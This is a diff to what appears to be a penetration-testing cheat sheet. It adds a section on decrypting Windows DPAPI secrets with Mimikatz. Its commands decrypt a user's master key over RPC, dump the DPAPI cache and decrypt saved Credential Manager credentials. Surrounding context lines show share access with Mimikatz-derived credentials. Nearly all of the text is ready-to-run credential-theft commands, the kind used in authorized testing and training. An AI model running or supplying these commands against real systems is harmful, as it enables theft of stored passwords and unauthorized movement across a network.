@@ -510,6 +510,24 @@ C:\> net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
 C:\> dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 ```
 
+### Data Protection API (DPAPI) Decryption
+
+> https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
+
+#### rpc
+
+```c
+mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
+```
+
+```c
+mimikatz # dpapi::cache
+```
+
+```c
+mimikatz # dpapi::cred /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4"
+```
+
 ## MultiDump
 
 > https://github.com/Xre0uS/MultiDump
